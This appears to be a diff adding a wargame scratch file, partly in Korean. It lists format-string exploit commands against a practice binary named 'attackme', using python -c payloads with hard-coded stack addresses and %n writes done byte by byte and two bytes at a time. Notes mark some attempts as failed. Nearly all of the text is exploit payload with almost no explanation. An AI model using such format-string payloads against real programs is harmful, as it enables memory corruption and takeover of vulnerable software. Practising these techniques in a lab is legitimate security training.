@@ -1,0 +1,27 @@
+bc
+./attackme `python -c 'print "\xbc\xfa\xff\xbf" + "\xbf\xfa\xff\xbf" + "\xbd\xfa\xff\xbf" + "\xbe\xfa\xff\xbf" + "%22x" + "%4\$n" + "%153x" + "%5\$n" + "%61x" + "%6\$n" + "%259x" + "%7\$n" '`
+
+ec
+실패
+./attackme `python -c 'print "\xec\xfa\xff\xbf" + "\xee\xfa\xff\xbf" + "\xed\xfa\xff\xbf" + "\xef\xfa\xff\xbf" + "%22x" + "%4\$n" + "%153x" + "%5\$n" + "%61x" + "%6\$n" + "%259x" + "%7\$n"'`
+
+차례대로
+./attackme `python -c 'print "\xec\xfa\xff\xbf" + "\xed\xfa\xff\xbf" + "\xee\xfa\xff\xbf" + "\xef\xfa\xff\xbf" + "%22x" + "%4\$n" + "%214x" + "%5\$n" + "%259x" + "%6\$n" + "%192x" + "%7\$n"'`
+
+./attackme `python -c 'print "\xbc\xfa\xff\xbf" + "\xbd\xfa\xff\xbf" + "\xbe\xfa\xff\xbf" + "\xbf\xfa\xff\xbf" + "%22x" + "%4\$n" + "%214x" + "%5\$n" + "%259x" + "%6\$n" + "%192x" + "%7\$n"'`
+
+
+
+
+2바이트 씩
+dc
+./attackme `python -c 'print "\xdc\xfa\xff\xbf"  + "\xde\xfa\xff\xbf" + "%49135x" + "%4\$n" + "%49216x" + "%5\$n" '`
+
+./attackme `python -c 'print "\xdc\xfa\xff\xbf"  + "\xde\xfa\xff\xbf" + "%49143x" + "%4\$n" '`
+
+./attackme `python -c 'print "\xdc\xfa\xff\xbf"  + "dong" + "\xde\xfa\xff\xbf" + "dong" + "%8x%8x%8x" + "%49135x" + "%4\$n" '`
+
+
+
+2의 보수 사용
+앞의 숫자가 더 큰 경우
